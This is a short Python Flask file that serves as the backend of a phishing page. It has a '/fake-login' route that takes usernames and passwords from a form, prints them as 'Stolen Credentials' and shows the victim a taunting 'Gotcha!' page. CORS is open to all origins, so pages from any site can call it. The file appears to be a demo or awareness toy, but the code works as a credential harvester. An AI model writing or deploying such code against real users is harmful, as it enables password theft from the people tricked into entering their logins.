from flask import Flask, request
from flask_cors import CORS

app = Flask(__name__)
CORS(app)  # Enable CORS for all routes


# Route to capture stolen credentials
@app.route('/fake-login', methods=['POST'])
def fake_login():
    # Capture username and password from the form data
    username = request.form.get('username')
    password = request.form.get('password')

    # Check if both username and password are provided
    if username and password:
        # Print the stolen credentials to the terminal
        print(f"Stolen Credentials - Username: {username}, Password: {password}")

        # Return a response to the user
        return f"""
            <div style="text-align: center; margin-top: 50px;">
                <h1>Gotcha! 😈</h1>
                <p>Your credentials have been stolen! <strong>Oops!</strong></p>
                <p>Username: <strong>{username}</strong></p>
                <p>Password: <strong>{password}</strong></p>
                <p>Better luck next time! 😜</p>
            </div>
        """

    # Return a message if no credentials were received
    return 'No credentials received.'


if __name__ == '__main__':
    # Run the Flask app in debug mode on port 5001
    app.run(debug=True, port=5001)
